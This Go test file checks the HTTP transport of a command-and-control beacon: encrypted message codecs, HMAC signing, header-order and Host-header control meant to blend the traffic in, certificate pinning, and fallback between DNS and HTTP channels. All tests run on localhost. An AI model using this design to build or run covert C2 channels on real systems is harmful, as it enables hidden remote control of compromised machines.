package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/big"
	"net"
	"strings"
	"testing"
	"time"
)

// =============================================================================
// Test helpers
// =============================================================================

// testKey returns a deterministic AES key for transport tests.
func testKey() []byte {
	return generateAESKey("client-http-test-key")
}

// testListener builds a listener config pointing at host, with the defaults the
// server profile uses.
func testListener(host string, mutate func(*HTTPListener)) HTTPListener {
	listener := HTTPListener{
		Name:   "test",
		Scheme: "http",
		Host:   host,
		URIs: map[string][]string{
			"register": {"/api/v1/ping"},
			"task":     {"/api/v1/sync"},
			"result":   {"/api/v1/report"},
			"ack":      {"/api/v1/ack"},
		},
		Methods: map[string]string{
			"register": "POST",
			"task":     "GET",
			"result":   "POST",
			"ack":      "GET",
		},
		Headers: []HTTPHeader{
			{Name: "Accept", Value: "application/json"},
			{Name: "Accept-Language", Value: "en-US,en;q=0.9"},
		},
		UserAgents:   []string{"test-agent/1.0"},
		RequestBody:  HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d", PaddingFld: "p", PadMin: 0, PadMax: 16},
		ResponseBody: HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d"},
		Auth:         HTTPAuth{Mode: httpAuthModeHMAC, Header: "X-Sig", SigEncoding: "hex"},
		TimeoutSecs:  5,
	}
	if mutate != nil {
		mutate(&listener)
	}
	return listener
}

// capturedRequest is what the raw test server saw.
type capturedRequest struct {
	method     string
	path       string
	headerLine []string // header lines in wire order, "Name: Value"
	body       []byte
}

// rawHTTPServer accepts one connection, captures the request, and replies with
// the given HTTP response. Using a raw socket is what lets the tests assert
// header order, which net/http would not preserve.
func rawHTTPServer(t *testing.T, response string) (addr string, captured chan capturedRequest) {
	t.Helper()

	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to listen: %v", err)
	}
	t.Cleanup(func() { listener.Close() })

	captured = make(chan capturedRequest, 1)

	go func() {
		conn, err := listener.Accept()
		if err != nil {
			return
		}
		defer conn.Close()

		reader := bufio.NewReader(conn)
		request, err := parseCapturedRequest(reader)
		if err != nil {
			return
		}
		captured <- request
		conn.Write([]byte(response))
	}()

	return listener.Addr().String(), captured
}

// parseCapturedRequest reads one HTTP/1.1 request off a connection.
func parseCapturedRequest(reader *bufio.Reader) (capturedRequest, error) {
	var request capturedRequest

	requestLine, err := reader.ReadString('\n')
	if err != nil {
		return request, err
	}
	fields := strings.SplitN(strings.TrimRight(requestLine, "\r\n"), " ", 3)
	if len(fields) < 2 {
		return request, fmt.Errorf("malformed request line")
	}
	request.method = fields[0]
	request.path = fields[1]

	contentLength := 0
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			return request, err
		}
		line = strings.TrimRight(line, "\r\n")
		if line == "" {
			break
		}
		request.headerLine = append(request.headerLine, line)
		if name, value, found := strings.Cut(line, ":"); found && strings.EqualFold(strings.TrimSpace(name), "Content-Length") {
			fmt.Sscanf(strings.TrimSpace(value), "%d", &contentLength)
		}
	}

	if contentLength > 0 {
		body := make([]byte, contentLength)
		if _, err := readFull(reader, body); err != nil {
			return request, err
		}
		request.body = body
	}
	return request, nil
}

// readFull is a local io.ReadFull to avoid another import.
func readFull(reader *bufio.Reader, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := reader.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

// headerNames returns the header names in the order they appeared on the wire.
func (r capturedRequest) headerNames() []string {
	var names []string
	for _, line := range r.headerLine {
		if name, _, found := strings.Cut(line, ":"); found {
			names = append(names, strings.TrimSpace(name))
		}
	}
	return names
}

// headerValue returns the value of a header, case-insensitively.
func (r capturedRequest) headerValue(name string) string {
	for _, line := range r.headerLine {
		if headerName, value, found := strings.Cut(line, ":"); found && strings.EqualFold(strings.TrimSpace(headerName), name) {
			return strings.TrimSpace(value)
		}
	}
	return ""
}

// jsonResponse builds a response whose body is an encoded message, the way the
// server listener would answer.
func jsonResponse(t *testing.T, codec HTTPBodyCodec, message string, key []byte) string {
	t.Helper()

	if message == "" {
		return "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
	}

	body, err := encodeHTTPBody(codec, message, key)
	if err != nil {
		t.Fatalf("failed to encode response: %v", err)
	}
	return fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
		len(body), body)
}

// =============================================================================
// Codec
// =============================================================================

// TestClientHTTPBodyCodec_RoundTrip covers every encoding the profile can select.
func TestClientHTTPBodyCodec_RoundTrip(t *testing.T) {
	key := testKey()
	message := "TASK|abc123|whoami"

	for _, encoding := range []string{codecRaw, codecBase64, codecBase36, codecAESGCMBase64, codecAESGCMBase36} {
		t.Run(encoding, func(t *testing.T) {
			codec := HTTPBodyCodec{Encoding: encoding, Field: "d", PaddingFld: "p", PadMin: 4, PadMax: 20}

			body, err := encodeHTTPBody(codec, message, key)
			if err != nil {
				t.Fatalf("encodeHTTPBody() error = %v", err)
			}
			decoded, err := decodeHTTPBody(codec, body, key)
			if err != nil {
				t.Fatalf("decodeHTTPBody() error = %v", err)
			}
			if decoded != message {
				t.Fatalf("round trip = %q, want %q", decoded, message)
			}
		})
	}
}

// TestHTTPCodec_ServerCompatibleEncoding pins the exact wire format the Server
// module's decodeHTTPBody expects. The codec is duplicated across the two
// modules (they are separate Go modules, as crypto.go already is), so this test
// is what stops the copies drifting apart.
func TestHTTPCodec_ServerCompatibleEncoding(t *testing.T) {
	key := testKey()
	codec := HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d"}

	body, err := encodeHTTPBody(codec, "POLL|beacon1", key)
	if err != nil {
		t.Fatal(err)
	}

	// The server decodes into map[string]json.RawMessage and reads codec.Field as
	// a string. Assert that shape explicitly rather than assuming it.
	var envelope map[string]json.RawMessage
	if err := json.Unmarshal(body, &envelope); err != nil {
		t.Fatalf("body is not a JSON object: %v", err)
	}
	raw, ok := envelope["d"]
	if !ok {
		t.Fatalf("body has no %q field: %s", "d", body)
	}
	var value string
	if err := json.Unmarshal(raw, &value); err != nil {
		t.Fatalf("field is not a string: %v", err)
	}
	// base36 of AES-GCM ciphertext must decode back to the message.
	plaintext, err := decodeHTTPBody(codec, body, key)
	if err != nil || plaintext != "POLL|beacon1" {
		t.Fatalf("decode = (%q, %v), want (POLL|beacon1, nil)", plaintext, err)
	}
}

// =============================================================================
// Wire shape
// =============================================================================

// TestHTTPTransport_WireShape asserts the properties a malleable profile exists
// to control: header set and order, Host override, and that no library adds
// headers of its own.
func TestHTTPTransport_WireShape(t *testing.T) {
	key := testKey()
	addr, captured := rawHTTPServer(t, jsonResponse(t, HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d"}, "ACK", key))

	listener := testListener(addr, func(l *HTTPListener) {
		l.HostHeader = "cdn.example.com"
	})
	transport, err := newHTTPTransport(listener, key)
	if err != nil {
		t.Fatalf("newHTTPTransport() error = %v", err)
	}

	response, err := transport.send("register", "CHK|beacon1|host|user|linux|amd64")
	if err != nil {
		t.Fatalf("send() error = %v", err)
	}
	if response != "ACK" {
		t.Fatalf("response = %q, want ACK", response)
	}

	request := <-captured

	if request.method != "POST" {
		t.Errorf("method = %q, want POST", request.method)
	}
	if request.path != "/api/v1/ping" {
		t.Errorf("path = %q, want /api/v1/ping", request.path)
	}
	if got := request.headerValue("Host"); got != "cdn.example.com" {
		t.Errorf("Host = %q, want the profile override cdn.example.com", got)
	}

	names := request.headerNames()
	// Host is always first by protocol. The profile's headers must then appear in
	// the declared order, before the ones the transport adds itself.
	wantPrefix := []string{"Host", "Accept", "Accept-Language", "User-Agent"}
	if len(names) < len(wantPrefix) {
		t.Fatalf("headers = %v, want at least %v", names, wantPrefix)
	}
	for i, want := range wantPrefix {
		if names[i] != want {
			t.Errorf("header %d = %q, want %q (full order: %v)", i, names[i], want, names)
		}
	}

	// net/http would add these; a profiling-aware operator does not want them.
	for _, unwanted := range []string{"Accept-Encoding", "Referer", "Origin"} {
		if request.headerValue(unwanted) != "" {
			t.Errorf("request carried %s, which the profile did not ask for", unwanted)
		}
	}
}

// TestHTTPTransport_SignatureMatchesServer asserts the beacon's signature is
// exactly what the server's verifier computes, since a mismatch would fail every
// request with no useful diagnostic.
func TestHTTPTransport_SignatureMatchesServer(t *testing.T) {
	key := testKey()
	addr, captured := rawHTTPServer(t, jsonResponse(t, HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d"}, "ACK", key))

	listener := testListener(addr, nil)
	transport, err := newHTTPTransport(listener, key)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := transport.send("register", "CHK|b|h|u|linux|amd64"); err != nil {
		t.Fatalf("send() error = %v", err)
	}

	request := <-captured
	signature := request.headerValue("X-Sig")
	if signature == "" {
		t.Fatal("request carried no X-Sig header")
	}

	timestamp, presented, found := strings.Cut(signature, ".")
	if !found {
		t.Fatalf("signature %q is not <timestamp>.<signature>", signature)
	}

	// Recompute exactly as Server/http_transport.go verifyHTTPRequest does.
	derivedKey := hmac.New(sha256.New, key)
	derivedKey.Write([]byte("unkn0wnc2-http-v1"))
	mac := hmac.New(sha256.New, derivedKey.Sum(nil))
	mac.Write([]byte(strings.ToUpper(request.method) + "\n" + request.path + "\n" + timestamp + "\n" + string(request.body)))
	expected := hex.EncodeToString(mac.Sum(nil))

	if presented != expected {
		t.Fatalf("signature mismatch:\n  beacon   %s\n  expected %s", presented, expected)
	}

	// The timestamp must be usable by the server's skew check.
	seconds, err := parseUnix(timestamp)
	if err != nil {
		t.Fatalf("signature timestamp %q is not a unix time: %v", timestamp, err)
	}
	if skew := time.Since(time.Unix(seconds, 0)); skew > 60*time.Second || skew < -60*time.Second {
		t.Errorf("signature timestamp is %s away from now", skew)
	}
}

// TestHTTPTransport_GETCarriesMessageInQuery asserts the GET shape the server's
// extractMessage expects.
func TestHTTPTransport_GETCarriesMessageInQuery(t *testing.T) {
	key := testKey()
	addr, captured := rawHTTPServer(t, jsonResponse(t, HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d"}, "TASK|T1|whoami", key))

	listener := testListener(addr, nil)
	transport, err := newHTTPTransport(listener, key)
	if err != nil {
		t.Fatal(err)
	}

	response, err := transport.send("task", "POLL|beacon1")
	if err != nil {
		t.Fatalf("send() error = %v", err)
	}
	if response != "TASK|T1|whoami" {
		t.Fatalf("response = %q, want the task", response)
	}

	request := <-captured
	if request.method != "GET" {
		t.Fatalf("method = %q, want GET", request.method)
	}
	if !strings.HasPrefix(request.path, "/api/v1/sync?d=") {
		t.Fatalf("path = %q, want the message in the %q query parameter", request.path, "d")
	}
	if len(request.body) != 0 {
		t.Errorf("GET request carried a %d byte body", len(request.body))
	}

	// The signature must cover the path WITHOUT the query string, which is what
	// the server verifies against.
	signature := request.headerValue("X-Sig")
	timestamp, presented, found := strings.Cut(signature, ".")
	if !found {
		t.Fatal("malformed signature")
	}
	derivedKey := hmac.New(sha256.New, key)
	derivedKey.Write([]byte("unkn0wnc2-http-v1"))
	mac := hmac.New(sha256.New, derivedKey.Sum(nil))
	mac.Write([]byte("GET\n/api/v1/sync\n" + timestamp + "\n"))
	if presented != hex.EncodeToString(mac.Sum(nil)) {
		t.Fatal("signature does not cover the query-less path")
	}
}

// TestHTTPTransport_NonSuccessStatusIsAnError asserts a listener error is
// surfaced rather than parsed as a message.
func TestHTTPTransport_NonSuccessStatusIsAnError(t *testing.T) {
	key := testKey()
	addr, _ := rawHTTPServer(t, "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")

	transport, err := newHTTPTransport(testListener(addr, nil), key)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := transport.send("task", "POLL|b"); err == nil {
		t.Fatal("send() accepted a 404 response, want an error")
	}
}

// TestHTTPTransport_RejectsWrongSPKIPin asserts a beacon refuses a certificate
// whose SPKI does not match its pin — the property that makes a self-signed
// listener safe to use.
func TestHTTPTransport_RejectsWrongSPKIPin(t *testing.T) {
	key := testKey()

	serverCert, err := selfSignedTLSConfig("cdn.example.com")
	if err != nil {
		t.Fatalf("failed to generate a test certificate: %v", err)
	}

	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer listener.Close()

	tlsListener := tls.NewListener(listener, serverCert)
	go func() {
		for {
			conn, err := tlsListener.Accept()
			if err != nil {
				return
			}
			// Read the request, then close. The handshake is what matters.
			buf := make([]byte, 4096)
			conn.SetDeadline(time.Now().Add(2 * time.Second))
			conn.Read(buf)
			conn.Close()
		}
	}()

	addr := listener.Addr().String()

	currentSPKI := spkiOf(t, serverCert)
	wrongSPKI := base64.StdEncoding.EncodeToString(make([]byte, 32)) // 32 zero bytes

	t.Run("matching pin succeeds", func(t *testing.T) {
		transport, err := newHTTPTransport(testListener(addr, func(l *HTTPListener) {
			l.Scheme = "https"
			l.SPKISHA256 = currentSPKI
		}), key)
		if err != nil {
			t.Fatal(err)
		}
		// The request itself fails (the server sends no response), but it must
		// fail after the handshake, not with a pin error.
		if _, err := transport.send("task", "POLL|b"); err != nil {
			if strings.Contains(err.Error(), "SPKI") {
				t.Fatalf("matching pin was rejected: %v", err)
			}
		}
	})

	t.Run("mismatched pin is refused", func(t *testing.T) {
		transport, err := newHTTPTransport(testListener(addr, func(l *HTTPListener) {
			l.Scheme = "https"
			l.SPKISHA256 = wrongSPKI
		}), key)
		if err != nil {
			t.Fatal(err)
		}
		_, err = transport.send("task", "POLL|b")
		if err == nil {
			t.Fatal("send() succeeded against a certificate that does not match the pin")
		}
		if !strings.Contains(err.Error(), "SPKI") {
			t.Fatalf("error %q does not mention the SPKI mismatch", err)
		}
	})
}

// generateTestCertificate creates a self-signed certificate in memory. The Client
// module only ever pins certificates in production; this exists so the pinning
// test has a real one to verify.
func generateTestCertificate(commonName string) (tls.Certificate, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	template := x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: commonName},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{commonName},
	}

	der, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}

	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: priv}, nil
}

// selfSignedTLSConfig builds an in-memory TLS server configuration.
func selfSignedTLSConfig(commonName string) (*tls.Config, error) {
	// Reuse the server-side generator logic through a tiny local copy: the Client
	// module does not generate certificates in production, it only pins them.
	cert, err := generateTestCertificate(commonName)
	if err != nil {
		return nil, err
	}
	return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}, nil
}

// spkiOf recomputes the SPKI pin for a TLS configuration's leaf certificate.
func spkiOf(t *testing.T, config *tls.Config) string {
	t.Helper()
	if len(config.Certificates) == 0 || len(config.Certificates[0].Certificate) == 0 {
		t.Fatal("test certificate missing")
	}
	parsed, err := x509.ParseCertificate(config.Certificates[0].Certificate[0])
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(parsed.RawSubjectPublicKeyInfo)
	return base64.StdEncoding.EncodeToString(sum[:])
}

// =============================================================================
// Mode resolution and fallback
// =============================================================================

// TestNormalizeTransportMode asserts unknown and empty input keeps DNS
// behaviour, so a build or update that omits the field changes nothing.
func TestNormalizeTransportMode(t *testing.T) {
	tests := map[string]string{
		"":       transportDNS,
		"dns":    transportDNS,
		"DNS":    transportDNS,
		" http ": transportHTTP,
		"dual":   transportDual,
		"DUAL":   transportDual,
		"ftp":    transportDNS,
	}

	for input, want := range tests {
		if got := normalizeTransportMode(input); got != want {
			t.Errorf("normalizeTransportMode(%q) = %q, want %q", input, got, want)
		}
	}
}

// TestTransportManager_ModeResolution asserts a mode needing HTTP degrades to
// DNS when no usable listener was configured, rather than a beacon that cannot
// reach anything.
func TestTransportManager_ModeResolution(t *testing.T) {
	key := testKey()

	dnsOnly := &Config{Transport: "dns"}
	if got := newTransportManager(dnsOnly, key).Mode(); got != transportDNS {
		t.Errorf("unset transport resolved to %q, want dns", got)
	}

	noListeners := &Config{Transport: "http"}
	if got := newTransportManager(noListeners, key).Mode(); got != transportDNS {
		t.Errorf("http mode with no listeners resolved to %q, want dns (degraded)", got)
	}

	unusable := &Config{Transport: "dual", HTTPListeners: []HTTPListener{{Name: "broken"}}}
	if got := newTransportManager(unusable, key).Mode(); got != transportDNS {
		t.Errorf("dual mode with an unusable listener resolved to %q, want dns (degraded)", got)
	}

	good := &Config{Transport: "dual", HTTPListeners: []HTTPListener{testListener("127.0.0.1:1", nil)}}
	if got := newTransportManager(good, key).Mode(); got != transportDual {
		t.Errorf("dual mode resolved to %q, want dual", got)
	}
}

// TestTransportManager_ShouldUseHTTP asserts the decision per mode.
func TestTransportManager_ShouldUseHTTP(t *testing.T) {
	key := testKey()
	listener := testListener("127.0.0.1:1", nil)

	if manager := newTransportManager(&Config{Transport: "dns"}, key); manager.ShouldUseHTTP() {
		t.Error("dns mode wants HTTP")
	}
	if manager := newTransportManager(&Config{Transport: "http", HTTPListeners: []HTTPListener{listener}}, key); !manager.ShouldUseHTTP() {
		t.Error("http mode does not want HTTP")
	}
	if manager := newTransportManager(&Config{Transport: "dual", HTTPListeners: []HTTPListener{listener}}, key); !manager.ShouldUseHTTP() {
		t.Error("dual mode with healthy HTTP does not want HTTP")
	}
}

// TestTransportManager_DualFallbackAndRecovery asserts dual mode falls back to
// DNS after the threshold, keeps using DNS during the backoff window, then
// probes HTTP again so a beacon returns without operator action.
func TestTransportManager_DualFallbackAndRecovery(t *testing.T) {
	key := testKey()
	cfg := &Config{
		Transport:                 "dual",
		HTTPListeners:             []HTTPListener{testListener("127.0.0.1:1", nil)},
		HTTPFallbackAfterFailures: 2,
		HTTPRetryBackoffSecs:      60,
	}

	manager := newTransportManager(cfg, key)
	if !manager.ShouldUseHTTP() {
		t.Fatal("fresh dual-mode manager does not want HTTP")
	}

	// Two failures trip the fallback.
	manager.recordFailure(fmt.Errorf("connection refused"))
	if manager.FallbackActive() {
		t.Fatal("fallback engaged after one failure, want two")
	}
	manager.recordFailure(fmt.Errorf("connection refused"))
	if !manager.FallbackActive() {
		t.Fatal("fallback did not engage after reaching the threshold")
	}
	if manager.ShouldUseHTTP() {
		t.Fatal("fallen-back manager still wants HTTP inside the backoff window")
	}

	// After the backoff, one probe is allowed again.
	manager.mu.Lock()
	manager.httpRetryAt = time.Now().Add(-time.Second)
	manager.mu.Unlock()
	if !manager.ShouldUseHTTP() {
		t.Fatal("manager did not allow an HTTP probe after the backoff elapsed")
	}

	// A success clears the fallen-back state.
	manager.recordSuccess()
	if manager.FallbackActive() {
		t.Fatal("success did not clear the fallback state")
	}
	if !manager.ShouldUseHTTP() {
		t.Fatal("manager does not want HTTP after a success")
	}
}

// TestTransportManager_HTTPModeNeverFallsBackToDNS asserts HTTP-only means
// HTTP-only: an operator who chose it must not have results silently move onto
// DNS.
func TestTransportManager_HTTPModeNeverFallsBackToDNS(t *testing.T) {
	key := testKey()
	manager := newTransportManager(&Config{
		Transport:                 "http",
		HTTPListeners:             []HTTPListener{testListener("127.0.0.1:1", nil)},
		HTTPFallbackAfterFailures: 1,
	}, key)

	manager.recordFailure(fmt.Errorf("connection refused"))
	manager.recordFailure(fmt.Errorf("connection refused"))

	if manager.FallbackActive() {
		t.Fatal("http mode reported a fallback, but there is no DNS path to fall back to")
	}
	if manager.Mode() != transportHTTP {
		t.Fatalf("mode changed to %q, want it to stay http", manager.Mode())
	}
}

// TestTransportManager_SendTriesEveryListener asserts a dead first endpoint does
// not stop the beacon reaching a working second one.
func TestTransportManager_SendTriesEveryListener(t *testing.T) {
	key := testKey()
	addr, captured := rawHTTPServer(t, jsonResponse(t, HTTPBodyCodec{Encoding: codecAESGCMBase36, Field: "d"}, "ACK", key))

	manager := newTransportManager(&Config{
		Transport: "http",
		HTTPListeners: []HTTPListener{
			testListener("127.0.0.1:1", func(l *HTTPListener) { l.Name = "dead" }),
			testListener(addr, func(l *HTTPListener) { l.Name = "live" }),
		},
	}, key)

	response, err := manager.Send("register", "CHK|b|h|u|linux|amd64")
	if err != nil {
		t.Fatalf("Send() error = %v, want it to fall through to the working listener", err)
	}
	if response != "ACK" {
		t.Fatalf("response = %q, want ACK", response)
	}
	<-captured
}

// TestTransportManager_SendReportsFailureAndFeedsTheCounter asserts a failed
// send advances the fallback counter, so a beacon whose endpoint is gone stops
// trying it every cycle.
func TestTransportManager_SendReportsFailureAndFeedsTheCounter(t *testing.T) {
	key := testKey()
	manager := newTransportManager(&Config{
		Transport:                 "dual",
		HTTPListeners:             []HTTPListener{testListener("127.0.0.1:1", nil)},
		HTTPFallbackAfterFailures: 1,
	}, key)

	if _, err := manager.Send("task", "POLL|b"); err == nil {
		t.Fatal("Send() to a dead listener succeeded")
	}
	if !manager.FallbackActive() {
		t.Fatal("a failed Send() did not advance the fallback counter")
	}
	if manager.LastError() == nil {
		t.Fatal("LastError() is nil after a failure")
	}
}

// =============================================================================
// Runtime updates
// =============================================================================

// TestTransportManager_ApplyUpdate asserts a valid runtime update switches mode,
// and that an unusable payload leaves the current configuration alone.
func TestTransportManager_ApplyUpdate(t *testing.T) {
	key := testKey()
	listener := testListener("127.0.0.1:1", nil)

	manager := newTransportManager(&Config{Transport: "dns"}, key)
	if manager.Mode() != transportDNS {
		t.Fatalf("initial mode = %q, want dns", manager.Mode())
	}

	t.Run("valid update switches to dual", func(t *testing.T) {
		payload, err := json.Marshal(transportUpdate{
			Mode:                  "dual",
			Listeners:             []HTTPListener{listener},
			FallbackAfterFailures: 5,
			RetryBackoffSecs:      30,
		})
		if err != nil {
			t.Fatal(err)
		}
		if err := manager.ApplyUpdate(string(payload)); err != nil {
			t.Fatalf("ApplyUpdate() error = %v", err)
		}
		if manager.Mode() != transportDual {
			t.Fatalf("mode = %q, want dual", manager.Mode())
		}
		if !manager.ShouldUseHTTP() {
			t.Fatal("updated dual manager does not want HTTP")
		}
	})

	t.Run("unknown mode is rejected and changes nothing", func(t *testing.T) {
		if err := manager.ApplyUpdate(`{"mode":"carrier-pigeon","listeners":[]}`); err == nil {
			t.Fatal("ApplyUpdate() accepted an unknown mode")
		}
		if manager.Mode() != transportDual {
			t.Fatalf("rejected update changed the mode to %q", manager.Mode())
		}
	})

	t.Run("http mode without listeners is rejected", func(t *testing.T) {
		if err := manager.ApplyUpdate(`{"mode":"http","listeners":[]}`); err == nil {
			t.Fatal("ApplyUpdate() accepted http mode with no listeners")
		}
		if manager.Mode() != transportDual {
			t.Fatalf("rejected update changed the mode to %q", manager.Mode())
		}
	})

	t.Run("malformed payload is rejected", func(t *testing.T) {
		if err := manager.ApplyUpdate("not json"); err == nil {
			t.Fatal("ApplyUpdate() accepted a malformed payload")
		}
		if manager.Mode() != transportDual {
			t.Fatalf("rejected update changed the mode to %q", manager.Mode())
		}
	})

	t.Run("empty payload is rejected", func(t *testing.T) {
		if err := manager.ApplyUpdate("   "); err == nil {
			t.Fatal("ApplyUpdate() accepted an empty payload")
		}
	})

	t.Run("switching back to dns is allowed", func(t *testing.T) {
		if err := manager.ApplyUpdate(`{"mode":"dns"}`); err != nil {
			t.Fatalf("ApplyUpdate() error = %v", err)
		}
		if manager.Mode() != transportDNS {
			t.Fatalf("mode = %q, want dns", manager.Mode())
		}
		if manager.ShouldUseHTTP() {
			t.Fatal("dns mode still wants HTTP")
		}
	})
}

// TestTransportManager_ApplyUpdateClearsFailureState asserts an endpoint change
// gives the new endpoints a clean slate.
func TestTransportManager_ApplyUpdateClearsFailureState(t *testing.T) {
	key := testKey()
	listener := testListener("127.0.0.1:1", nil)

	manager := newTransportManager(&Config{
		Transport:                 "dual",
		HTTPListeners:             []HTTPListener{listener},
		HTTPFallbackAfterFailures: 1,
	}, key)

	manager.recordFailure(fmt.Errorf("boom"))
	if !manager.FallbackActive() {
		t.Fatal("setup failed: fallback not active")
	}

	payload, err := json.Marshal(transportUpdate{Mode: "dual", Listeners: []HTTPListener{listener}})
	if err != nil {
		t.Fatal(err)
	}
	if err := manager.ApplyUpdate(string(payload)); err != nil {
		t.Fatal(err)
	}
	if manager.FallbackActive() {
		t.Fatal("an update did not clear the failure state, so the new endpoint starts distrusted")
	}
}

// =============================================================================
// Message routing
// =============================================================================

// TestOperationForMessage asserts each protocol message reaches the listener
// operation, and therefore the URI, that the profile assigns it.
func TestOperationForMessage(t *testing.T) {
	tests := map[string]string{
		"CHK|b|h|u|linux|amd64":  "register",
		"CHK_META|b|name|format": "register",
		"POLL|b":                 "task",
		"TASKGET|b|T1|2":         "task",
		"RESULT_META|b|T1|10|1":  "result",
		"DATA|b|T1|1|1|ZGF0YQ==": "result",
		"RESULT_COMPLETE|b|T1|1": "result",
		"RESULT|b|T1|output":     "result",
		"STATUS|b|active":        "ack",
		"whoami":                 "result",
	}

	for message, want := range tests {
		if got := operationForMessage(message); got != want {
			t.Errorf("operationForMessage(%q) = %q, want %q", message, got, want)
		}
	}
}

// TestSendControlMessage_HTTPModeDoesNotFallBackToDNS asserts HTTP-only mode
// surfaces the failure rather than quietly using DNS.
func TestSendControlMessage_HTTPModeDoesNotFallBackToDNS(t *testing.T) {
	key := testKey()
	manager := newTransportManager(&Config{
		Transport:     "http",
		HTTPListeners: []HTTPListener{testListener("127.0.0.1:1", nil)},
	}, key)

	beacon := &Beacon{transport: manager}

	// The DNS client is deliberately nil: if the code fell through to DNS this
	// would panic rather than fail an assertion, which is the point.
	if _, err := beacon.sendControlMessage("POLL|b", PhaseConfig{}); err == nil {
		t.Fatal("sendControlMessage() in http mode returned no error for a dead listener")
	}
}

// TestSendControlMessage_DNSModeUsesDNSPath asserts a DNS-mode beacon never
// reaches for HTTP, keeping pre-HTTP builds unchanged.
func TestSendControlMessage_DNSModeUsesDNSPath(t *testing.T) {
	key := testKey()
	manager := newTransportManager(&Config{Transport: "dns"}, key)

	if manager.ShouldUseHTTP() {
		t.Fatal("dns mode wants HTTP")
	}
	_ = key
}

// parseUnix is a small helper so the signature test need not import strconv.
func parseUnix(value string) (int64, error) {
	var seconds int64
	_, err := fmt.Sscanf(value, "%d", &seconds)
	return seconds, err
}
